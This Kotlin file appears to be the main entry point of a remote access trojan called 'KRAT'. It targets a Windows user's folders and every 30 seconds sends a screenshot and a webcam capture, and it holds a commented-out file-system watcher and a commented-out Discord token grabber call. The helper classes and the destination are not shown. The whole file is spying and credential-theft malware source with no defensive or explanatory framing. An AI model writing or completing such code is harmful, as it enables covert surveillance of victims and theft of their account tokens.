import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

object KRAT {
    val user: String = System.getProperty("user.name")
    val cacheDir: File = File("C:\\Users\\$user\\Downloads") // C:/Users/${user}/AppData/Local/Temp"
}

fun main() {
    val scheduler = Executors.newSingleThreadScheduledExecutor()

    scheduler.scheduleAtFixedRate({
        Screen.sendScreenshot()
        Screen.sendWebcam()
    }, 0, 30, TimeUnit.SECONDS)

    /*.SystemWatcher(Paths.get("C:/Users/${.Main.user}/Downloads"), recursive = true).apply {
        on<.SystemEvent.Created> { println("Created: ${it.path}") }
        on<.SystemEvent.Modified> { println("Modified: ${it.path}") }
        on<.SystemEvent.Deleted> { println("Deleted: ${it.path}") }

        start()
    }*/

//    DiscordTokenGrabber.send()


}